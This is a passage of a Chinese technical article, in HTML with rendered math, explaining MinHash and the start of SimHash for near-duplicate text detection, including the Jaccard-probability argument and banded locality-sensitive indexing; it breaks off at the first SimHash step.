<p>此外，随着 K 增大，文档特征向量的维数也急剧增加。当 K=1 时，特征向量的维数即为文档集中互异词汇的个数；当 K为文档集中最大的文本长度，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo>(</mo><mi>l</mi><mi>e</mi><mi>n</mi><mo>(</mo><mi>D</mi><mo>)</mo><mo>)</mo></mrow><annotation encoding="application/x-tex">K=max(len(D))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span> 时，由于重复的文本为少数，此时特征向量的维数接近于文档集中的文档个数。在海量文本，如互联网网页数据中，文档个数远远大于词汇个数。</p>
<p>进一步地，由于特征向量维数的增加，大大降低了特征向量之间距离的计算效率。</p>
<p><strong>2.特征向量处理</strong></p>
<p>文档特征向量是取值为范围为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo fence="true">}</mo></mrow><annotation encoding="application/x-tex">\left\{ 0,1 \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span> 的向量。如果用int存储，每一个元素占4个字节共32个bit；如果用二进制存储，每个元素只占1个bit。特征向量的交集和并集，对二进制向量来说，可以通过效率更高的位运算实现。因此用二进制来表示文档的特征向量，从时间和空间上都有更好的性能。</p>
<p>但不论以int还是bit来存储，得到的特征向量都是稀疏且高维的。如果能对特征向量进行降维，再计算相似度，可以提高计算效率，代表算法有<strong>minhash</strong>。</p>
<p><strong>3.相似度计算</strong></p>
<p>假设文档集包含 T 个文档，两两比较需要计算 µ 次，对海量文档集计算两两之间的Jaccard相似度是不现实的。如果能缩小两两比较的计算范围，也能提高计算效率，代表算法有<strong>simhash</strong>。</p>
<p><strong>注：minhash和simhash都属于局部敏感哈希（Local Sensitive Hash）。一般的哈希算法对于相似文本的哈希结果可能差别非常大，局部敏感哈希在普通哈希的基础上保留了一定程度的相似性，即相似文本的哈希结果距离较小。</strong></p>
<h2 id="二-minhash算法"><strong>二、Minhash算法</strong></h2>
<p>对海量文本而言，K-shingle算法得到的特征向量是超高维的，导致该算法非常巨大的时间复杂度和空间复杂度。Minhash算法设计了一种最小哈希函数，将原始超高维的稀疏向量转化为低维的稠密向量，降低了计算的空间复杂度。同时，对转换后的稠密向量进行分段索引，缩小潜在相似文本范围，降低了计算的时间复杂度。</p>
<p><strong>最小哈希函数</strong>：对一个列向量按行进行随机排列，重排后第一个非零元素的行号就是最小哈希函数值。直观上来说，如果两个文本完全重复，那么不论如何重排，两个文本对应的最小哈希函数值都应该是一样的。</p>
<h2 id="一算法步骤-2">（一）算法步骤</h2>
<ol>
<li>
<p>提取K-shingle特征向量：执行K-shingle算法的1~3步，将每篇文档表示为01向量。</p>
</li>
<li>
<p>计算Minhash特征向量：生成一个随机排列，对文档矩阵进行重排：如果每一列表示一个文档，那么对行进行重排；如果每一行表示一个文档，那么对列进行重排。假设每一列表示一个文档，对行进行重排后，取每一列第一个取值为1的元素对应的行号，作为该列对应文档在此次随机排列后的最小哈希值。重复上述过程 N 次后，即可为每个文档生成一个 N 维的Minhash特征向量。</p>
</li>
<li>
<p>建立分段索引，提取潜在相似文本对：将 N 维特征向量进行分段后，建立倒排索引。不难理解，<strong>当分段数足够大时，两个相似文本有极大概率在某一段取值一样</strong>，极端情况下，每一个元素作为一段，两个重复的文本，必然每一段取值都一样。因此，可以将同一索引值下的文本两两组合，作为潜在相似文本对。</p>
</li>
<li>
<p>计算潜在相似文本对的相似性：两个Minhash向量对应位置元素相等的比例，即为这两个文本的相似度<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>i</mi><mi>m</mi><mi>i</mi><mi>l</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>t</mi><mi>y</mi><mo>=</mo><mfrac><mrow><msubsup><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>1</mn></mrow><mi>N</mi></msubsup><mrow><mi>I</mi><mo>(</mo><msub><mi>x</mi><mi>n</mi></msub><mo>=</mo><mo>=</mo><msub><mi>y</mi><mi>n</mi></msub><mo>)</mo></mrow></mrow><mi>N</mi></mfrac></mrow><annotation encoding="application/x-tex">similarity = \frac{\sum_{n=1}^{N}{I(x_{n}==y_{n})}}{N}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.523372em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.178372em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5350070000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9190928571428572em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32143857142857146em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">=</span><span class="mrel mtight">=</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 。当相似度大于指定阈值时，可认为两个文本为重复文本。</p>
</li>
</ol>
<h2 id="二算法分析-2">（二）算法分析</h2>
<p><strong>1. 两个集合最小哈希值相等的概率等于两个集合的Jaccard相似度，即：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>(</mo><mi>M</mi><mi>i</mi><mi>n</mi><mi>h</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo>(</mo><msub><mi>S</mi><mn>1</mn></msub><mo>)</mo><mo>=</mo><mi>M</mi><mi>i</mi><mi>n</mi><mi>h</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo>(</mo><msub><mi>S</mi><mn>2</mn></msub><mo>)</mo><mo>)</mo><mo>=</mo><mi>J</mi><mi>a</mi><mi>c</mi><mi>c</mi><mi>a</mi><mi>r</mi><mi>d</mi><mo>(</mo><msub><mi>S</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>S</mi><mn>2</mn></msub><mo>)</mo></mrow><annotation encoding="application/x-tex">P(Minhash(S_{1}) = Minhash(S_{2})) = Jaccard(S_{1},S_{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p>
<p>关于这个结论，非严格的论证如下：</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mo>=</mo><msub><mi>S</mi><mn>1</mn></msub><mo>∩</mo><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">X=S_{1} \cap S_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，即集合 S_{1} 和 S_{2} 中同时存在的元素</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Y</mi><mo>=</mo><mo>(</mo><msub><mi>S</mi><mn>1</mn></msub><mo>−</mo><msub><mi>S</mi><mn>2</mn></msub><mo>)</mo><mo>∪</mo><mo>(</mo><msub><mi>S</mi><mn>2</mn></msub><mo>−</mo><msub><mi>S</mi><mn>1</mn></msub><mo>)</mo></mrow><annotation encoding="application/x-tex">Y=(S_{1}-S_{2}) \cup (S_{2}-S_{1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> ，即只存在于集合 S_{1} 中或只存在于集合 S_{2} 中的元素</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Z</mi><mo>=</mo><mo>∼</mo><msub><mi>S</mi><mn>1</mn></msub><mo>∩</mo><mo>∼</mo><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">Z=\sim S_{1} \cap \sim S_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∩</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，即集合 S_{1} 和 S_{2} 中都不存在的元素</p>
<p>由于 Z 对集合 S_{1} 和 S_{2} 的相似性没有影响，因此可以忽略。由于排列是完全随机的，因此任一行为 X 类元素的概率为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mo fence="true">∣</mo><mi>X</mi><mo fence="true">∣</mo></mrow><mrow><mrow><mo fence="true">∣</mo><mi>X</mi><mo fence="true">∣</mo></mrow><mo>+</mo><mrow><mo fence="true">∣</mo><mi>Y</mi><mo fence="true">∣</mo></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\left| X \right|}{\left| X \right| + \left| Y \right|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span><span class="mbin mtight">+</span><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mathdefault mtight" style="margin-right:0.22222em;">Y</span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> ，即集合 S_{1} 和 S_{2}的Jaccard相似度。</p>
<p><strong>2. 当分段数足够大时，两个相似文本有极大概率在某一段取值一样。</strong></p>
<p>假设将 N 维的Minhash特征向量分成 B 段，每一段长度为 C ，即 N=B*C ，记 r=P(Minhash(S_{1}) = Minhash(S_{2})) ，则集合 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">S_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的Minhash值 和 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">S_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的Minhash值至少有一段相同的概率为： <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>=</mo><mn>1</mn><mo>−</mo><msup><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><msup><mi>r</mi><mi>C</mi></msup><mo fence="true">)</mo></mrow><mi>B</mi></msup></mrow><annotation encoding="application/x-tex">p=1-\left( 1-r^{C} \right)^{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.4312409999999998em;vertical-align:-0.35001em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07153em;">C</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0812309999999998em;"><span style="top:-3.3029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span></span></span></span></span></span></span></span> 。当 r 和 N 固定时，p 随 B 单调递增。</p>
<p>令 r = 0.4，C=3，B = 100 ，代入公式计算的概率为 p=0.9986585，这表明两个Jaccard相似度为0.4的集合，各自300维的Minhash特征向量分100段后，在至少一段内冲撞的概率达到了99.9%。</p>
<p><strong>3. 最小哈希方案</strong></p>
<p>方案一是每次重排后，取第一个非零元素下标，重复 N 次，得到 N 维向量</p>
<p>方案二是一次重排后，随机取 N 个非零元素下标，得到 N 维向量</p>
<p>方案二比方案一的计算效率更高。</p>
<h2 id="三-simhash算法"><strong>三、Simhash算法</strong></h2>
<p>KShingle算法和Minhash算法都需要生成一个庞大的Shingle词组库，当文本数量和文本长度很大时，计算这个词组库需要耗费巨大的时间和空间资源，且各文档的特征向量计算都依赖这个共同的词组库，因此计算特征向量的过程很难完全地并行化。Simhash算法仅基于文档中包含的词汇生成文档的特征向量，极大提高了计算效率。</p>
<h2 id="一算法步骤-3">（一）算法步骤</h2>
<ol>
<li>
<p>预处理：读取文档数据集，根据需求，对文档中的标点、空白、中英文、简繁体等字符进行清洗和整理。</p>
</li>
<li>
